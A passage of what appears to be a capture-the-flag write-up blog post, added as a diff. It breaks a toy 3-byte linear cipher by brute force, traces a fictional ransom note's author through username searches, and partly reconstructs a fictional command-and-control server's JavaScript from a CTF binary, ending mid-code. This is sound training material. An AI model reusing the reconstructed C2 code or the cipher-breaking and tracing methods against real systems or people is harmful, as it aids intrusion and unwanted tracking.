+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(B(<span style="color:#f92672">*</span>K,<span style="color:#f92672">*</span>W) <span style="color:#66d9ef">for</span> W <span style="color:#f92672">in</span> zip(<span style="color:#f92672">*</span>[iter(M)]<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)</code></pre></div>
+</div>
+<p>
+The difficult part was understanding what <code class="verbatim">B</code> does. A 9 byte key gets assigned to <code class="verbatim">A</code>-<code class="verbatim">I</code> and three bytes of plaintext to <code class="verbatim">X</code>, <code class="verbatim">Y</code>, and <code class="verbatim">Z</code>.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    B<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I,X,Y,Z:bytes((A<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
+                                       D<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>E<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>F<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
+                                       G<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>H<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>I<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>))</code></pre></div>
+</div>
+<p>
+If we take a look at 1 line <code class="verbatim">A*X+B*Y+C*Z&amp;0xFF</code> we can see that the first 3 bytes of the key (<code class="verbatim">A,B,C</code>) and all three bytes of the plaintext (<code class="verbatim">X,Y,Z</code>) are use to create the cyphertext.</p>
+<p>
+We know that this is a block cypher because it takes 3 bytes in and returns 3 bytes out. We also know some plaintex-&gt;cyphertext conversions because we see how the script is being run in that SPACEARMY is being prepended to each message. So we can say
+There&#39;s some key K such that C(K, b&#39;SPA&#39;) = b&#39;\x25\x9F\x8D&#39;
+Because each character of text only uses 3 bytes to encrypt a message we can pretty easily brute force this.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solver</span>(cleartext, cyphertext):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    cleartext is 3 bytes
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    possibles <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">255</span>):
+        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">255</span>):
+            <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">255</span>):
+                result <span style="color:#f92672">=</span> cleartext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> x <span style="color:#f92672">+</span> cleartext[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> y <span style="color:#f92672">+</span> cleartext[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">*</span> z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>
+                <span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">==</span> cyphertext:
+                    possibles<span style="color:#f92672">.</span>append([x,
+                                      y,
+                                      z])
+    <span style="color:#66d9ef">return</span> possibles</code></pre></div>
+</div>
+<p>
+This tries to find all 3 byte keys that transform our plaintext into the known cyphertext. I run this for all 3 plaintext-&gt;cypher blocks that we know and find which keys are common to all 3 (this exact code is lost to the python interpreter). There is only one possible key that satisfies all three known blocks. So now that we know the encryption key the question is whether or not we can reverse the solver and derive the decryption key:</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Is there an inverse key?</span>
+<span style="color:#75715e"># 25 9F 8D 01 4A 44 C2 BE 8F</span>
+a <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x25\x9f\x8d</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;S&#39;</span>)
+b <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01\x4a\x44</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span>)
+c <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc2\xbe\x8f</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;R&#39;</span>)
+tmp <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> a <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> b]
+key1 <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> c <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> tmp]
+
+a <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x25\x9f\x8d</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;P&#39;</span>)
+b <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01\x4a\x44</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;E&#39;</span>)
+c <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc2\xbe\x8f</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;M&#39;</span>)
+tmp <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> a <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> b]
+key2 <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> c <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> tmp]
+
+a <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x25\x9f\x8d</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
+b <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01\x4a\x44</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
+c <span style="color:#f92672">=</span> solver(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc2\xbe\x8f</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Y&#39;</span>)
+tmp <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> a <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> b]
+key3 <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> c <span style="color:#66d9ef">if</span> x <span style="color:#f92672">in</span> tmp]
+
+key <span style="color:#f92672">=</span> key1[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> key2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> key3[<span style="color:#ae81ff">0</span>]</code></pre></div>
+</div>
+<p>
+So what&#39;s our decryption key?</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([x<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> key])
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SP4evaCES&#39;</span></code></pre></div>
+</div>
+<p>
+I&#39;m going to wager a bet and say that&#39;s probably the key…</p>
+<p>
+Now let&#39;s decrypt the forum messages:</p>
+<blockquote>
+<p>C(b&#39;SP4evaCES&#39;, &lt;&lt;BYTES&gt;&gt;)</p>
+<p>
+b&#34;SPACEARMYWelcome on board and congratulations on joining the Order of 0x20.\n\nTogether we will fight the good fight and bring enlightenment to the non-believers: Let&#39;s stop the global TAB infestation once and for all. This forum is a place to share news and coordinate action, but be careful: you never know who&#39;s watching.\n\n 040 <code class="verbatim">= 32 =</code> 0x20\n\n– admin.\n&#34;</p>
+<p>
+b&#39;SPACEARMYMy name is rudi. i was fired by my Old employer because I refused to use TABs. THIS madness must be STOPPED! These people must be STOPPED!1! But I fought back! I hacked their network established access. Let me know if you have an idea how to take revegne!\n\n 040 <code class="verbatim">= 32 =</code> 0x20\n\n– rudi.\n&#39;</p>
+<p>
+b&#39;SPACEARMYGood job!\n\n 040 <code class="verbatim">= 32 =</code> 0x20\n\nCS{if_computers_could_think_would_they_like_spaces?}\n&#39;</p>
+</blockquote>
+<p>
+Key: <code class="verbatim">CS{if_computers_could_think_would_they_like_spaces?}</code></p>
+</div>
+</div>
+<div id="outline-container-headline-4" class="outline-3">
+<h3 id="headline-4">
+Catapult Spider - Much Sad
+</h3>
+<div id="outline-text-headline-4" class="outline-text-3">
+<blockquote>
+<p>We have received some information that CATAPULT SPIDER has encrypted a client&#39;s cat pictures and successfully extorted them for a ransom of 1337 Dogecoin. The client has provided the ransom note, is there any way for you to gather more information about the adversary&#39;s online presence?</p>
+</blockquote>
+<p>
+We were given the following file</p>
+<div class="src src-plain">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">+------------------------------------------------------------------------------+
+|                                                                              |
+|                        ,oc,                                                  |
+|   BAD CAT.            ,OOxoo,                                  .cl::         |
+|                       ,OOxood,                               .lxxdod,        |
+|       VERY CRYPTO!    :OOxoooo.                             &#39;ddddoc:c.       |
+|                       :kkxooool.                          .cdddddc:::o.      |
+|                       :kkdoooool;&#39;                      ;dxdddoooc:::l;      |
+|                       dkdooodddddddl:;,&#39;&#39;...         .,odcldoc:::::ccc;      |
+|                      .kxdxkkkkkxxdddddddxxdddddoolccldol:lol:::::::colc      |
+|                     &#39;dkkkkkkkkkddddoddddxkkkkkxdddooolc:coo::;&#39;&#39;,::llld      |
+|                 .:dkkkkOOOOOkkxddoooodddxkxkkkxddddoc:::oddl:,.&#39;;:looo:      |
+|             &#39;:okkkkkkkOO0000Okdooodddddxxxxdxxxxdddddoc:loc;...,codool       |
+|           &#39;dkOOOOOOkkkO00000Oxdooddxxkkkkkkxxdddxxxdxxxooc,..&#39;;:oddlo.       |
+|          ,kOOO0OOkOOOOOO00OOxdooddxOOOOOkkkxxdddxxxxkxxkxolc;cloolclod.      |
+|         .kOOOO0Okd:;,cokOOkxdddddxOO0OOOOOkxddddddxkxkkkkkxxdoooollloxk&#39;     |
+|         l00KKKK0xl,,.&#39;,xkkkkkxxxxkOOOkkOkkkkkxddddddxkkkkkkkkxoool::ldkO&#39;    |
+|        &#39;00KXXKK0oo&#39;&#39;..ckkkkkkkOkkkkkkxl;&#39;.&#39;:oddddddxkkkkkkkkkkkdol::codkO.   |
+|        xKKXXK00Oxl;:lxkkkkkkOOkkddoc,&#39;lx:&#39;   ;lddxkkkkkkkxkkkkkxdolclodkO.   |
+|       ;KKXXXK0kOOOOOkkkkOOOOOOkkdoc&#39;.&#39;o,.  ..,oxkkkOOOkkkkkkkkkkddoooodxk    |
+|       kKXKKKKKOOO00OOO00000OOOkkxddo:;;;&#39;&#39;;:okOO0O0000OOOOOOOOOkkxddddddx    |
+|      .KKKKKKKKOkxxdxkkkOOO000OkkkxkkkkkxxkkkkkOO0KKKKK0OOOO000OOOkkdddddk.   |
+|      xKKKKKKc,&#39;&#39;&#39;&#39;&#39;&#39;&#39;;lx00K000OOkkkOOOkkkkkkkkO0KKKKKK0OO0000O000Okkxdkkx    |
+|     &#39;KK0KKXx. ..    ...&#39;xKKKK00OOOOO000000000OO0KKKKKKKKKKKKK0OOOOOkxdkko    |
+|     xKKKKKXx,...      .,dKXKK00000000KKKKKKKKKKKKKKKKKKKK000OOOOOOkxddxd.    |
+|    ,KKKKKXKd&#39;.....  ..,ck00OOOOOOkO0KKKKKKKKKKKKKKKKKK0OOOOkkkkkkkxdddo.     |
+|    .KKKKK0xc;,......&#39;,cok0O0OOOkkkk0KKKK00000KKK000OOOkkkkkkkkkkkxdddd.      |
+|    .KKKKK0dc;,,&#39;&#39;&#39;&#39;&#39;&#39;,:oodxkkkkkkkkkOOOOkOOOOkkkkkkkkkkkkkkkOOkkxdddd,       |
+|     0KKKKK0x;&#39;.   ...&#39;;lodxxkkkkkkddkkkkkkkkkkkkkkkkkkOOOOOkkOkkkxddc        |
+|     xKKKKKK0l;&#39;........&#39;;cdolc:;;;:lkkkkkkkkkkkkkkkkOO000OOOOOOkxddd.        |
+|     :KKKKK00Oxo:,&#39;&#39;,&#39;&#39;&#39;&#39;...,,,;;:ldxkkkkkkkkkkkkkOkkOOOOOOOOkkkxddd&#39;         |
+|      oKKKKK0OOkxlloloooolloooodddxkkkkkkkkkkkkkkkkkkkkkkkOOkkkxddd.          |
+|       :KKK00OO0OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkO0Okkkkkkkkxddd:            |
+|        o0KK00000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkO0000Okkkkkkxdo;.             |
+|         &#39;d00000000OOOOOOkkkkkkkkkkkkkkkkkOkOO00Okkkkkkkkkkko,                |
+|           .oO00000OOOOOkkkkkkkkkkkkkkkkkkOOOOkOOkkkkkkkkko&#39;                  |
+|             .;xO0OOOOOOkkkkkkkkkkkkkkkkkkkkkOkkkkkkkkd:.                     |
+|                .lxOOOOkkkkkkkkkkkkkkkkkkkxxxkkkkkd:&#39;                         |
+|                   .;okkkkkkkkxxkkdxxddxdxdolc;&#39;..                            |
+|                       ...&#39;,;::::::;;,&#39;...                                    |
+|                                                                              |
+|                            MUCH SAD?                                         |
+|                      1337 DOGE = 1337 DOGE                                   |
+|                DKaHBkfEJKef6r3L1SmouZZcxgkDPPgAoE                            |
+|              SUCH EMAIL shibegoodboi@protonmail.com                          |
++------------------------------------------------------------------------------+</code></pre></div>
+</div>
+<p>
+People love their usernames so doing a google search for <code class="verbatim">shibegoodboi</code> yielded the twitter account <img src="/images/wow-twitter.png" alt="/images/wow-twitter.png" title="/images/wow-twitter.png" /></p>
+<p>
+which lead to <a href="https://github.com/shibefan">this</a> github page. Perusing the repos lead to <a href="https://github.com/shibefan/shibefan.github.io">this blog</a> and within the <a href="https://github.com/shibefan/shibefan.github.io/blob/main/index.html">index.html</a> file was the key.</p>
+<p>
+Key: <code class="verbatim">CS{shibe_good_boi_doge_to_the_moon}</code></p>
+</div>
+</div>
+<div id="outline-container-headline-5" class="outline-3">
+<h3 id="headline-5">
+Catapult Spider - Very Protocol
+</h3>
+<div id="outline-text-headline-5" class="outline-text-3">
+<blockquote>
+<p>We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on</p>
+</blockquote>
+<p>
+This was probably the most time consuming of the CTF challenges that I was able to complete. This files was a massive linux ELF binary. It appears that there was an embedded <a href="https://github.com/dogescript/dogescript">dogescript</a> command-and-control server embedded in the file.</p>
+<p>
+This was probably suboptimal but I used <code class="verbatim">strings -n 1 malware &gt; out.txt</code> to write all the strings to a file. I then put all of the dogescript through a doge-&gt;javascript converter so I could read it without completely losing my mind. After some massive cleanup I was left with something like the following code (plus come ommitted keys and certificates):</p>
+<div class="src src-javascript">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dson</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dogeon&#39;</span>);
+<span style="color:#75715e">// var dogescript = require(&#39;dogescript&#39;);
+</span><span style="color:#75715e">// var mysterious = require(&#39;./muchmysterious&#39;);
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cript_key</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">15</span>);
+<span style="color:#75715e">// if (process.env.CRYPTZ === undefined) {
+</span><span style="color:#75715e">//     console.log(&#39;no cryptz key. doge can not crypt catz.&#39;);
+</span><span style="color:#75715e">//     process.exit(1);
+</span><span style="color:#75715e">// }
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">secrit_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cript</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">CRYPTZ</span>, <span style="color:#a6e22e">cript_key</span>);
+<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">CRYPTZ</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;you dnt git key&#39;</span>;
+<span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">CRYPTZ</span>;
+
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Networker</span> {
+
+    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">socket</span>, <span style="color:#a6e22e">handler</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_packet</span> <span style="color:#f92672">=</span> {};
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_process</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_state</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HEADER&#39;</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_payloadLength</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span> <span style="color:#f92672">=</span> [];
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">handler</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">handler</span>;
+    };
+    <span style="color:#a6e22e">init</span>(<span style="color:#a6e22e">hmac_key</span>, <span style="color:#a6e22e">aes_key</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">salty_wow</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;suchdoge4evawow&#39;</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hmac_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">pbkdf2Sync</span>(<span style="color:#a6e22e">hmac_key</span>, <span style="color:#a6e22e">salty_wow</span>, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;sha256&#39;</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">aes_key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">pbkdf2Sync</span>(<span style="color:#a6e22e">aes_key</span>, <span style="color:#a6e22e">salty_wow</span>, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">16</span>, <span style="color:#e6db74">&#39;sha256&#39;</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f1</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">data</span>) =&gt; {
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span>;
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">data</span>);
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_process</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_onData</span>();
+        };
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;data&#39;</span>, <span style="color:#a6e22e">f1</span>);
+
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Socket not shibe: &#39;</span>, <span style="color:#a6e22e">err</span>);
+        });
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dis_handle</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">handler</span>;
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;served&#39;</span>, <span style="color:#a6e22e">dis_handle</span>);
+    };
+    <span style="color:#a6e22e">_hasEnough</span>(<span style="color:#a6e22e">size</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;BufferedBytes: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Needs to be &gt; than: payloadLength: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">size</span> );
+        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">size</span>) {
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+        } <span style="color:#66d9ef">else</span> { <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;not enough bytes :(&#34;</span>) }
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_process</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    };
+    <span style="color:#a6e22e">_readBytes</span>(<span style="color:#a6e22e">size</span>) {
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;buffered bytes before: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">size</span>; <span style="color:#75715e">// buffered bytes will be -4
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;buffered bytes after: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_bufferedBytes</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;queue0: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>]);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;queue0_len: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">length</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">size</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">length</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;doing the first thing&#34;</span>);
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>.<span style="color:#a6e22e">shift</span>();
+        }
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">size</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">length</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;doing the second thing&#34;</span>);
+            <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">size</span>);
+            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">slice</span>(<span style="color:#a6e22e">size</span>);
+
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
+        }
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;wilding out&#34;</span>);
+        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">allocUnsafe</span>(<span style="color:#a6e22e">size</span>);
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">length</span>;
+        <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">size</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">length</span>;
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">size</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">length</span>) {
+                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">copy</span>(<span style="color:#a6e22e">result</span>, <span style="color:#a6e22e">offset</span>);
+                <span style="color:#a6e22e">offset</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">length</span>;
